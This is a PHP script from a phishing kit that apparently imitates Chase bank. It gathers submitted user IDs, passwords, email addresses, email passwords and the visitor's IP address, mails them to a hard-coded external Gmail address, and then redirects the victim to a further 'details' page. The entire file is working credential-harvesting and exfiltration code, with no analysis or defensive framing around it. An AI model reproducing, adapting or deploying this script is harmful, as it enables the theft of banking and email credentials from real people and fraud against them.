<?php
$ip = getenv("REMOTE_ADDR");
$message="";
$message .= "-----------------------------------------------\n";
$message .= "User ID: ".$_POST['userid']."\n";
$message .= "Password: ".$_POST['userp']."\n";

$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "-----------------------------------------------\n";
$message .= "IP : ".$ip."\n";
$message .= "-------------------Demo-------------------\n";


$recipient = "gmcdonald121@gmail.com";

$headers = "From: Demo - ";

$headers .= "MIME-Version: 1.0\n";
mail(
$recipient,"Chase",
$message);
header("Location: details.php");
?>
